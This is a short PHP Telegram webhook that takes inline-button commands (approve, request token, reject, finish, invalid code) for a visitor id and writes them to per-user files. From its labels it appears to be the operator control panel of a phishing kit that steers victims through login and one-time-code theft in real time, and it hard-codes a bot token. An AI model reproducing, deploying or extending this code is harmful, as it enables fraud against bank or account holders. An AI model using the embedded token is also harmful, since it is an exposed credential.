<?php
// Webhook del bot de Telegram — procesa callback_query de los botones inline
$token = '8849191947:AAG0KCpFSyxiwz5ukZGnJx8CY9oKV9zgQnk';

$update = json_decode(file_get_contents('php://input'), true);
if (!isset($update['callback_query'])) exit;

$data  = $update['callback_query']['data'] ?? '';
$cb_id = $update['callback_query']['id']   ?? '';

if (strpos($data, '|') === false) exit;

list($cmd, $uid) = explode('|', $data, 2);

$allowed = ['CONTINUE', 'TOKEN', 'ERROR', 'FINISH', 'INVALID'];
if (!in_array($cmd, $allowed, true)) exit;

$dir  = __DIR__ . '/acciones';
if (!file_exists($dir)) mkdir($dir, 0777, true);

$safe = preg_replace('/[^a-zA-Z0-9_-]/', '', $uid);
file_put_contents($dir . '/' . $safe . '.txt', $cmd);

$labels = [
    'CONTINUE' => 'Aprobado',
    'TOKEN'    => 'Token solicitado',
    'ERROR'    => 'Rechazado',
    'FINISH'   => 'Finalizado',
    'INVALID'  => 'Codigo invalido',
];

@file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
    'callback_query_id' => $cb_id,
    'text'              => $labels[$cmd] ?? 'OK',
    'show_alert'        => false,
]));
